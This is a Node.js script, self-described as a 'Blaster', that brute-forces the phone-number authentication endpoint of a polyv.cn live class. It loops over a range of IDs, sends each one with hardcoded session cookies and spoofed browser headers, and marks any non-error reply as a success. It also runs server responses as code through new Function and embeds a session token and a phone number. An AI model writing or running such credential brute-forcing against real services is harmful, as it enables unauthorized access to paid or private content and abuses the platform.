const fetch   = require('node-fetch');
const chalk   = require('chalk');
const fs      = require("fs");

const rl = require('readline').createInterface({input: process.stdin, output: process.stdout});
const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));
const question = (query) => new Promise(resolve => rl.question(query, (answer) => resolve(answer)));

var lower_bound = 114500;
var upper_bound = 114600;
var classid = 1919810;

var res = "";
var options = {
	"headers": {
		"accept": "application/json, text/javascript, */*; q=0.01",
		"accept-language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
		"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
		"sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"101\", \"Microsoft Edge\";v=\"101\"",
		"sec-ch-ua-mobile": "?0",
		"sec-ch-ua-platform": "\"Windows\"",
		"sec-fetch-dest": "empty",
		"sec-fetch-mode": "cors",
		"sec-fetch-site": "same-origin",
		"x-requested-with": "XMLHttpRequest",
		"cookie": "language=zh_CN; acw_tc=1b9f44a016532113317314326e5f0436170d0dff17aea9f727f3ce9b78; SESSION=956f8a2b-4da6-47a2-9c20-aa17b8982871",
		"Referer": "https://live.polyv.cn/splash/2782450",
		"Referrer-Policy": "strict-origin-when-cross-origin"
	},
	"body": "phone=17317388112",
	"method": "POST"
};

(async () => {
	console.clear();
	process.stdout.write("Blaster customized for 培懋教育\n");
	process.stdout.write("From " + lower_bound + " to " + upper_bound);
	process.stdout.write(" " + (upper_bound - lower_bound + 1) + " PhoneID in all\n\n");
	let phoneid = lower_bound - 1;
	while (phoneid < upper_bound) {
		phoneid ++;
		let if_redo = true;
		while (if_redo) {
			try {
				let target = "https://live.polyv.cn/auth/" + classid + "/pc-phone";
				process.stdout.write("Blasting " + classid + " with key " + phoneid);
				options.body = "phone=" + phoneid;
				//res = await (await fetch(target, options)).text();
				res = await (await fetch(target, options)).text();
				//process.stdout.write(" Success");
				res = (new Function("return " + res))();
				
				//console.log(res);
				
				if (res.status != 'error') process.stdout.write(" " + chalk.underline(chalk.green("SUCCESS\n")));
				else process.stdout.clearLine(), process.stdout.write("\r");
				
				if_redo = false;
			} catch (err) {
				if_redo = true;
				console.log('出现错误，错误信息如下：');
				console.log(err);
				await question("\n回车以重试");
				console.clear();
			}
		}
	}
	process.stdout.write("\nFinished Blasting from " + lower_bound + " to " + upper_bound);
	process.stdout.write(" " + (upper_bound - lower_bound + 1) + " PhoneID in all\n\n");
	process.exit(0);
})();